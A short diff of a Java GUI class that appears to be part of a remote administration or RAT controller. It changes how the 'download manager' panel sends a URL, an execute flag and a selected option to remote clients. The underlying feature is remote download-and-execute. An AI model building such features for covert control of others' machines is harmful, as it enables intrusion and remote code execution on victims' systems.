@@ -67,7 +67,7 @@ public class PanelControlDownloadManager extends PanelControlParent {
 				}
 				model.addRow(new Object[] { IconUtils.getIcon("update", true), txtURL.getText().trim(), chckbxExecute.isSelected() + "", comboBox.getSelectedItem().toString(), "Sent..." });
 
-				sl.addToSendQueue(new Packet34AdvancedDownload(txtURL.getText().trim(), chckbxExecute.isSelected(), comboBox.getSelectedItem().toString().toLowerCase()));
+				sl.addToSendQueue(new Packet34AdvancedDownload(txtURL.getText().trim(), chckbxExecute.isSelected(), comboBox.getSelectedIndex()));
 			}
 		});
 		btnDownload.setIcon(IconUtils.getIcon("arrow-down"));
